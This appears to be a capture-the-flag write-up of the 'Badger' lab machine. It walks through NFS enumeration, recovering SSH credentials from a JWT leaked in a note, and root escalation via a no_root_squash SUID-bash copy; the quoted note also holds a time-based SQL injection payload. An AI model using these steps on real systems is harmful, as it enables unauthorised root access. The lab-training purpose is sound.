---
layout: default
title:NFS TO ROOT
---

# 💀 Badger
### Category: Boot2Root
### Difficult:Easy

<hr>

### Description:
Badger is an easy-rated machine on PwnTillDawn. The initial foothold is achieved through NFS enumeration to gain access to a share then access to ssh through a credential leaked in a file named note.txt present in the nfs share then access to root through `no_root_squash` misconfiguration

## Reconnaissance:

I started with standard network reconnaissance using **nmap**: `nmap <ip> -p- -A -T 4 -vv`

*OPEN PORTS AAND SERVICES*
``` 
| Port      | State | Service  | Version                |
| --------- | ----- | -------- | ---------------------- |
| 22/tcp    | Open  | SSH      | OpenSSH 8.4p1 (Ubuntu) |
| 111/tcp   | Open  | RPCBind  | v2-4                   |
| 2049/tcp  | Open  | NFS ACL  | RPC #100227            |
| 39437/tcp | Open  | NlockMgr | RPC #100021            |
| 42675/tcp | Open  | Mountd   | RPC #100005            |
| 44459/tcp | Open  | Mountd   | RPC #100005            |
| 50985/tcp | Open  | Mountd   | RPC #100005            |

```
From the above result it is clear that we have NFS running on the virtual host, now lets do some nfs enumeration 

## NFS ENUMERATION

I run the command `showmount -e <ip>` to list all share avaliable for mount.
Result:
```
Export list for 10.150.150.59:
/nfsroot *
```
Mount the share on my loacl system for futher enumeration
command `sudo mount -t nfs <ip>:/nfsroot /mnt -nolock`
Then I cd to the /mnt directory and found the first flag in file named FLAG1 and also a found a file named note.txt.
```
total 16
drwxr-xr-x  2 root root 4096 Dec 29  2023 .                                                                          
drwxr-xr-x 19 root root 4096 Mar 23 22:38 ..                                                                         
-rwxrwxrwx  1 root root   41 Dec 29  2023 FLAG1                                                                      
-rw-r--r--  1 root root  616 Nov 17  2021 notes.txt
```
note.txt content:
```
VULNS:
---                                                                                
Logout via GET allowed 
---               
robots.txt -> check, admin page noted
SQLI in the main.php parameter id, time based:                                                                       
?id=1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)
---
No serverside check of auth data, simply parsed from client-submitted string, checked with POC:                      
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwic2VydmVyIjoiY2xpZW50MDEiLCJuYW1lIjoiamVzc3kiLCJwYXNzIjoiNz9KbnYyQjlARSR3IiwiaWF0IjoxNTE2MjM5MDIyfQ.H8XhbfR_rR33W8hkIWTWf8RtqUjFToA2RBMkCCDeKGM
---                                                                              
X-Frame-Options + X-XSS-Protection headers not set            
tocheck:                                                                         
... 
```
Upon decoding the JWT i found a creds and try it against the ssh then I'm in to the ssh server as a user 
```
{
  "sub": "1234567890",
  "server": "client01",
  "name": "jessy",
  "pass": "7?*******",
  "iat": 1516239022
}
```
Then ssh login using `ssh jessy@<ip>` and read the FLAG2 from jessy home directory


* * *

## Privilege Esclation

Since its nfs first I do is to check /etc/exports then I notice `no_root_squash`
```
 cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/nfsroot *(rw,no_root_squash,no_subtree_check)
```
Little Note :"In the /etc/exports file, if you find some directory that is configured as no_root_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine."~source [hacktrick](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html)

The exploitation:
1. cd back to /mnt on my machine
2. Run `sudo cp /bin/bash .` to copy my bash config file to the current directory which is /mnt
3. Then chmod +s bash
4. cd to /nfsroot on the remote machine and run ./bash -p
5. we are now root user
```
jessy@badger:/nfsroot$ ls
bash  FLAG1  notes.txt
jessy@badger:/nfsroot$ bash -p
jessy@badger:/nfsroot$ ./bash -p
bash-5.1# id
uid=1000(jessy) gid=1000(jessy) euid=0(root) egid=0(root) groups=0(root),1000(jessy)
```
Lesson learnt: Always secure every services running on your server, a little misconfiguration can leads to big attack

Thanks for reading

<a href="https://d3vnul10.github.io" style="display:inline-block; padding:8px 12px; background:#00ff00; color:#000; text-decoration:none; border-radius:4px;">
⬅ Back to Home
</a>
